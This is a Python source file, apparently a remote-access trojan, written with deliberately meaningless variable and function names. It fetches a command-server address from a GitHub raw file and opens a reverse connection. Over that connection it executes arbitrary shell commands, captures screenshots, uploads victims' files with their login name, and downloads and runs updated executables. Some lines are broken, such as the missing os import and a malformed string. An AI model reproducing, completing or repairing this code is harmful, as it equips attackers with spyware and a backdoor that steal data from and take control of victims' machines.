import sys,subprocess,socket,time,requests
from PIL import ImageGrab
hzkRZMCIOBtTwyVOUSscDm = "1.29.11.24"
hyuUCphItoxiJslWt = ""
yTvlAJlmVZHVSJfbkCZOmvA = ""
fnzZvIT = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
IDATFXGvRxO = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
xyNhGPvoiNmETFkIVf = "!"
def uqGTSWwXfmaZZBvkUGqbpcq(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def EZySMTCLjMEIhQB(s):
	NaebKChPAIKvIiPYr = s.recv(1024)
	if len(NaebKChPAIKvIiPYr)==0:
		return True
	ZFKGfmhzQnXgSr = NaebKChPAIKvIiPYr.decode("utf-8")
	if not ZFKGfmhzQnXgSr.startswith(xyNhGPvoiNmETFkIVf):
		proc = subprocess.run(NaebKChPAIKvIiPYr.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	WtgtHPQvXi = ZFKGfmhzQnXgSr.split(" ")[0][1:]
	if WtgtHPQvXi == "download":
		wiOBfYjHOtqJlFuFc(s, ZFKGfmhzQnXgSr)
	elif WtgtHPQvXi == "screenshot":
		oWFXuNLFGUcAgPO(s)
def wiOBfYjHOtqJlFuFc(s, ZFKGfmhzQnXgSr):
	yXATuYCrsRvyAzasW = ZFKGfmhzQnXgSr.replace(xyNhGPvoiNmETFkIVf+"screenshot ", "").split(",")
	results = []
	for f in yXATuYCrsRvyAzasW:
		results += XBMiuMhkXtq(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def oWFXuNLFGUcAgPO(ZFKGfmhzQnXgSr):
	aIgBjjYVwUOcwhzmVc = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	aIgBjjYVwUOcwhzmVc.save(fpath)
	aIgBjjYVwUOcwhzmVc.close()
	r = XBMiuMhkXtq(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def XBMiuMhkXtq(OMuRAWuXqqkLNBwpqeCZwN, CGdtAUd, OcpqsoWgVVVchQNQSImbcua=None):
	if not os.path.exists(OMuRAWuXqqkLNBwpqeCZwN):
		return "FILE NOT FOUND: "+OMuRAWuXqqkLNBwpqeCZwN
	headers = {"user":os.getlogin()}
	if OcpqsoWgVVVchQNQSImbcua is not None:
		headers = {**headers, **OcpqsoWgVVVchQNQSImbcua}
	requests.post(hyuUCphItoxiJslWt+":"+yTvlAJlmVZHVSJfbkCZOmvA+"/"+CGdtAUd,
		files={open(OMuRAWuXqqkLNBwpqeCZwN, "rb")},
		headers=headers)
	return "SUCCESS"
def tRZSkkm():
	if hyuUCphItoxiJslWt == "" or yTvlAJlmVZHVSJfbkCZOmvA == "":
		NaebKChPAIKvIiPYr = requests.get(fnzZvIT).text.replace("\n","").split(":")
		hyuUCphItoxiJslWt = NaebKChPAIKvIiPYr[0].strip()
		yTvlAJlmVZHVSJfbkCZOmvA = NaebKChPAIKvIiPYr[1].strip()
		fHeYMCerJFRpCohIcAF = NaebKChPAIKvIiPYr[2].strip()
	return hyuUCphItoxiJslWt, yTvlAJlmVZHVSJfbkCZOmvA, fHeYMCerJFRpCohIcAF
def bUhlDflUfXqmYjwve():
	argGHvIPlKKGTHJDX = os.path.basename(__file__)
	fileType = argGHvIPlKKGTHJDX.split(".")[-1]
	FWZLzxXYXojCeOWEer = argGHvIPlKKGTHJDX.replace(fileType,"") +"."+hzkRZMCIOBtTwyVOUSscDm + fileType
	KEQqYGzsOuQIozhoCe = os.path.join(os.path.getcwd(), FWZLzxXYXojCeOWEer)
	with open(FWZLzxXYXojCeOWEer, "wb+") as f:
		f.write(requests.get(IDATFXGvRxO+"/file"+KEQqYGzsOuQIozhoCe.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+KEQqYGzsOuQIozhoCe)
	elif fileType == ".pyw":
		os.system("python "+KEQqYGzsOuQIozhoCe")
def HPuoQRQUMcQBzcSyVby():
	pass
def EOSqddZGQxCTIhLYYnVIlXq():
	h, p, v = tRZSkkm()
	if hzkRZMCIOBtTwyVOUSscDm != v:
		bUhlDflUfXqmYjwve()
	HPuoQRQUMcQBzcSyVby()
	while True:
		try:
			while True:
				tXFSUMgxY=False
				try:
					s=uqGTSWwXfmaZZBvkUGqbpcq(h, p)
					while not tXFSUMgxY:
						s.send(b"\n>> ")
						tXFSUMgxY=EZySMTCLjMEIhQB(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(EOSqddZGQxCTIhLYYnVIlXq())
